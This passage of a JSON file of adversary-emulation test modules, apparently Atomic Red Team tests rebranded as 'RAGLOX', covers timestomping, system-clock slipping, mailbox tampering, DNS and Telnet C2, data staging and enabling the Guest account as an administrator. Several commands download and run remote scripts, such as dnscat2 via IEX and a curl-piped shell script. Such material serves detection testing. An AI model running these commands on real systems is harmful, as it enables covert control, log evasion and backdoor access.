      "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "import-module \"#{file_path}\\timestomp.ps1\"\ntimestomp -dest \"#{file_path}\\kxwn.lock\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "File path for timestomp payload",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads"
        }
      ],
      "prerequisites": [
        {
          "description": "timestomp.ps1 must be present in #{file_path}.\n",
          "check_command": "if (Test-Path \"#{file_path}\\timestomp.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"\n"
        },
        {
          "description": "kxwn.lock must be present in #{file_path}.\n",
          "check_command": "if (Test-Path -path \"#{file_path}\\kxwn.lock\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File\n"
        }
      ],
      "rx_module_id": "d7512c33-3a75-4806-9893-69abc3ccdd43",
      "module_name": "Windows - Timestomp a File"
    },
    {
      "index": 474,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Stomps on the modification timestamp of a file using MacOS's SetFile utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "SetFile -m #{target_date} #{target_filename}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{target_filename}\n"
      },
      "variables": [
        {
          "name": "target_filename",
          "description": "Path of file that we are going to stomp on last modified time\n",
          "type": "path",
          "default_value": "/tmp/T1070.006-modified.txt"
        },
        {
          "name": "target_date",
          "description": "Date to replace original timestamps with",
          "type": "string",
          "default_value": "01/01/1970"
        }
      ],
      "prerequisites": [
        {
          "description": "The file must exist in order to be timestomped\n",
          "check_command": "test -e #{target_filename} && exit 0 || exit 1\n",
          "install_command": "echo 'T1070.006 MacOS file modified timestomp test' > #{target_filename}\n"
        }
      ],
      "rx_module_id": "87fffff4-d371-4057-a539-e3b24c37e564",
      "module_name": "MacOS - Timestomp Date Modified"
    },
    {
      "index": 475,
      "technique_id": "T1070.006",
      "technique_name": "Indicator Removal on Host: Timestomp",
      "description": "Changes the system time on the computer to a time that you specify. It involves altering the systems clock or adjusting the dates of files, affecting timestamp integrity within Event Logs. This technique can disrupt the sequence of logged events, complicating incident analysis and forensics. \nReference - \nhttps://detect.fyi/event-log-manipulations-1-time-slipping-55bf95631c40\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date?view=powershell-7.4",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "try{ \n  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})\n  Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}\n}\ncatch {exit 1}\n",
        "elevation_required": true,
        "cleanup_command": "if(Test-Path \"$env:APPDATA\\slipDays.bak\" ){\n  foreach($line in (get-content $env:APPDATA\\slipDays.bak)){\n    Set-Date -Date (Get-Date).AddDays(-$line)\n  }\n  rm \"$env:APPDATA\\slipDays.bak\"\n}\n"
      },
      "variables": [
        {
          "name": "days_to_modify",
          "description": "Value to which system time will update",
          "type": "string",
          "default_value": "3"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7bcf83bf-f5ef-425c-9d9a-71618ad9ed12",
      "module_name": "Event Log Manipulations- Time slipping via Powershell"
    },
    {
      "index": 476,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and deletes mail data on Windows\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d29f01ea-ac72-4efc-8a15-bea64b77fabf",
      "module_name": "Copy and Delete Mailbox Data on Windows"
    },
    {
      "index": 477,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and deletes mail data on Linux\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*\n",
        "elevation_required": true,
        "cleanup_command": "rm -rf /var/spool/mail/copy\nif [ -f \"$(ls -A /var/spool/mail/temp)\" ]; then rm /var/spool/mail/temp; fi\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Create dummy file in /var/spool/mail/ if no files exist\n",
          "check_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then exit 1; else exit 0; fi\n",
          "install_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then touch /var/spool/mail/temp; fi\n"
        }
      ],
      "rx_module_id": "25e2be0e-96f7-4417-bd16-a4a2500e3802",
      "module_name": "Copy and Delete Mailbox Data on Linux"
    },
    {
      "index": 478,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and deletes mail data on macOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\nrm -rf ~/Library/Mail/copy/*\n",
        "elevation_required": true,
        "cleanup_command": "rm -rf ~/Library/Mail/copy\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3824130e-a6e4-4528-8091-3a52eeb540f6",
      "module_name": "Copy and Delete Mailbox Data on macOS"
    },
    {
      "index": 479,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and modifies mail data on Windows\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for RAGLOX Red Test\" -ErrorAction Ignore }\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "edddff85-fee0-499d-9501-7d4d2892e79b",
      "module_name": "Copy and Modify Mailbox Data on Windows"
    },
    {
      "index": 480,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and modifies mail data on Linux\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then echo \"Modification for RAGLOX Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"; fi; fi; done\n",
        "elevation_required": true,
        "cleanup_command": "rm -rf /var/spool/mail/copy\nif [ -f \"$(ls -A /var/spool/mail/temp)\" ]; then rm /var/spool/mail/temp; fi\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Create dummy file in /var/spool/mail/ if no files exist\n",
          "check_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then exit 1; else exit 0; fi\n",
          "install_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then touch /var/spool/mail/temp; fi\n"
        }
      ],
      "rx_module_id": "6d99f93c-da56-49e3-b195-163090ace4f6",
      "module_name": "Copy and Modify Mailbox Data on Linux"
    },
    {
      "index": 481,
      "technique_id": "T1070.008",
      "technique_name": "Email Collection: Mailbox Manipulation",
      "description": "Copies and modifies mail data on macOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "mkdir ~/Library/Mail/copy\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\necho \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt\n",
        "elevation_required": true,
        "cleanup_command": "rm -rf ~/Library/Mail/copy\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8a0b1579-5a36-483a-9cde-0236983e1665",
      "module_name": "Copy and Modify Mailbox Data on macOS"
    },
    {
      "index": 482,
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "description": "An adversary may establish Telnet communication from a compromised endpoint to a command and control (C2) server in order to carry out additional attacks on objectives.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{client_path} #{server_ip} --port #{server_port}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "server_ip",
          "description": "C2 server IP or URL",
          "type": "url",
          "default_value": "127.0.0.1"
        },
        {
          "name": "client_path",
          "description": "Client agent path",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1071\\bin\\telnet_client.exe"
        },
        {
          "name": "server_port",
          "description": "C2 server port",
          "type": "integer",
          "default_value": 23
        }
      ],
      "prerequisites": [
        {
          "description": "A command and control (C2) server can be established by running PathToRagloxModulesFolder\\T1071\\bin\\telnet_server.exe on a specified server with a specified IP that must be reachable by a client (telnet_client.exe)\n",
          "check_command": "$connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}\nif ($connection.TcpTestSucceeded) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host \"Setup C2 server manually\"\n"
        }
      ],
      "rx_module_id": "3b0df731-030c-4768-b492-2a3216d90e53",
      "module_name": "Telnet C2"
    },
    {
      "index": 483,
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol: Web Protocols",
      "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "www.google.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "81c13829-f6c9-45b8-85a6-053366d55297",
      "module_name": "Malicious User Agents - Powershell"
    },
    {
      "index": 484,
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol: Web Protocols",
      "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{curl_path} -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\n#{curl_path} -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "www.google.com"
        },
        {
          "name": "curl_path",
          "description": "path to curl.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\Curl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Curl must be installed on system \n",
          "check_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.6.0_2/curl-8.6.0_2-win32-mingw.zip\" -Outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\\curl-8.6.0_2-win32-mingw\\bin\\curl.exe\" #{curl_path}\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\curl.zip\"\n"
        }
      ],
      "rx_module_id": "dc3488b0-08c7-4fea-b585-905c83b48180",
      "module_name": "Malicious User Agents - CMD"
    },
    {
      "index": 485,
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol: Web Protocols",
      "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "www.google.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2d7c471a-e887-4b78-b0dc-b0df1f2e0658",
      "module_name": "Malicious User Agents - Nix"
    },
    {
      "index": 486,
      "technique_id": "T1071.004",
      "technique_name": "Application Layer Protocol: DNS",
      "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "query_volume",
          "description": "Number of DNS queries to send",
          "type": "integer",
          "default_value": 1000
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.nip.io"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1700f5d6-5a44-487b-84de-bc66f507b0a6",
      "module_name": "DNS Large Query Volume"
    },
    {
      "index": 487,
      "technique_id": "T1071.004",
      "technique_name": "Application Layer Protocol: DNS",
      "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-Location \"PathToRagloxModulesFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "runtime",
          "description": "Time in minutes to run the simulation",
          "type": "integer",
          "default_value": 30
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.nip.io"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "c2_interval",
          "description": "Seconds between C2 requests to the command and control server",
          "type": "integer",
          "default_value": 30
        },
        {
          "name": "c2_jitter",
          "description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests",
          "type": "integer",
          "default_value": 20
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3efc144e-1af8-46bb-8ca2-1376bb6db8b6",
      "module_name": "DNS Regular Beaconing"
    },
    {
      "index": 488,
      "technique_id": "T1071.004",
      "technique_name": "Application Layer Protocol: DNS",
      "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-Location \"PathToRagloxModulesFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "query_type",
          "description": "DNS query type",
          "type": "string",
          "default_value": "TXT"
        },
        {
          "name": "subdomain",
          "description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)",
          "type": "string",
          "default_value": "ragloxragloxragloxragloxragloxredte"
        },
        {
          "name": "domain",
          "description": "Default domain to simulate against",
          "type": "string",
          "default_value": "127.0.0.1.nip.io"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fef31710-223a-40ee-8462-a396d6b66978",
      "module_name": "DNS Long Domain Query"
    },
    {
      "index": 489,
      "technique_id": "T1071.004",
      "technique_name": "Application Layer Protocol: DNS",
      "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "Domain Name configured to use DNS Server where your C2 listener is running",
          "type": "string",
          "default_value": "example.com"
        },
        {
          "name": "server_ip",
          "description": "IP address of DNS server where your C2 listener is running",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7",
      "module_name": "DNS C2"
    },
    {
      "index": 490,
      "technique_id": "T1072",
      "technique_name": "Software Deployment Tools",
      "description": "An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"%PROGRAMFILES(x86)%/#{radmin_exe}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "radmin_installer",
          "description": "Radmin Viewer installer",
          "type": "path",
          "default_value": "RadminViewer.msi"
        },
        {
          "name": "radmin_exe",
          "description": "The radmin.exe executable from RadminViewer.msi",
          "type": "path",
          "default_value": "Radmin Viewer 3/Radmin.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Radmin Viewer Utility must be installed at specified location (#{radmin_exe})\n",
          "check_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{radmin_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading radmin installer\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.radmin.com/download/Radmin_Viewer_3.5.2.1_EN.msi\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{radmin_installer}\"\nWrite-Host Install Radmin\nStart-Process msiexec  -Wait -ArgumentList /i , \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{radmin_installer}\", /qn\n"
        }
      ],
      "rx_module_id": "b4988cad-6ed2-434d-ace5-ea2670782129",
      "module_name": "Radmin Viewer Utility"
    },
    {
      "index": 491,
      "technique_id": "T1072",
      "technique_name": "Software Deployment Tools",
      "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "PDQ_Deploy_installer",
          "description": "PDQ Deploy Install",
          "type": "path",
          "default_value": "PDQDeploysetup.exe"
        },
        {
          "name": "PDQ_Deploy_exe",
          "description": "The PDQDeployConsole.exe executable from PDQDeploysetup.exe",
          "type": "path",
          "default_value": "Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "PDQ Deploy will be installed at specified location (#{PDQ_Deploy_exe})\n",
          "check_command": "if (Test-Path \"${env:ProgramFiles(x86)}/#{PDQ_Deploy_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading PDQ Deploy installer\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.pdq.com/release/19/Deploy_19.3.350.0.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\"\nWrite-Host Install PDQ Deploy\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\#{PDQ_Deploy_installer}\" -Wait -ArgumentList \"/s\"\n"
        }
      ],
      "rx_module_id": "e447b83b-a698-4feb-bed1-a7aaf45c3443",
      "module_name": "PDQ Deploy RAT"
    },
    {
      "index": 492,
      "technique_id": "T1072",
      "technique_name": "Software Deployment Tools",
      "description": "An adversary may use Chocolatey to remotely deploy the 7-Zip file archiver utility.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Deploy 7-Zip using Chocolatey\nchoco install -y 7zip\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Chocolatey must be installed to deploy 7-Zip.\n",
          "check_command": "if (Test-Path \"${env:ProgramFiles(x86)}\\Chocolatey\\choco.exe\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading Chocolatey installer\nInvoke-WebRequest -Uri \"https://chocolatey.org/install.ps1\" -OutFile \"chocolatey-install.ps1\"\nWrite-Host Installing Chocolatey\nStart-Process -FilePath \"powershell.exe\" -ArgumentList \"-NoProfile -ExecutionPolicy Bypass -File chocolatey-install.ps1\" -Wait\n"
        }
      ],
      "rx_module_id": "2169e8b0-2ee7-44cb-8a6e-d816a5db7d8a",
      "module_name": "Deploy 7-Zip Using Chocolatey"
    },
    {
      "index": 493,
      "technique_id": "T1074.001",
      "technique_name": "Data Staged: Local Data Staging",
      "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Location to save downloaded discovery.bat file",
          "type": "path",
          "default_value": "$env:TEMP\\discovery.bat"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "107706a5-6f9f-451a-adae-bab8c667829f",
      "module_name": "Stage data from Discovery.bat"
    },
    {
      "index": 494,
      "technique_id": "T1074.001",
      "technique_name": "Data Staged: Local Data Staging",
      "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "curl -s https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Location to save downloaded discovery.bat file",
          "type": "path",
          "default_value": "/tmp/T1074.001_discovery.log"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if curl is installed on the machine.\n",
          "check_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
          "install_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
        }
      ],
      "rx_module_id": "39ce0303-ae16-4b9e-bb5b-4f53e8262066",
      "module_name": "Stage data from Discovery.sh"
    },
    {
      "index": 495,
      "technique_id": "T1074.001",
      "technique_name": "Data Staged: Local Data Staging",
      "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path #{output_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Location to save zipped file or folder",
          "type": "path",
          "default_value": "$env:TEMP\\Folder_to_zip.zip"
        },
        {
          "name": "input_file",
          "description": "Location of file or folder to zip",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1074.001\\bin\\Folder_to_zip"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a57fbe4b-3440-452a-88a7-943531ac872a",
      "module_name": "Zip a Folder with PowerShell for Staging in Temp"
    },
    {
      "index": 496,
      "technique_id": "T1078.001",
      "technique_name": "Valid Accounts: Default Accounts",
      "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user #{guest_user} /active:yes\nnet user #{guest_user} #{guest_password}\nnet localgroup #{local_admin_group} #{guest_user} /add\nnet localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
        "elevation_required": true,
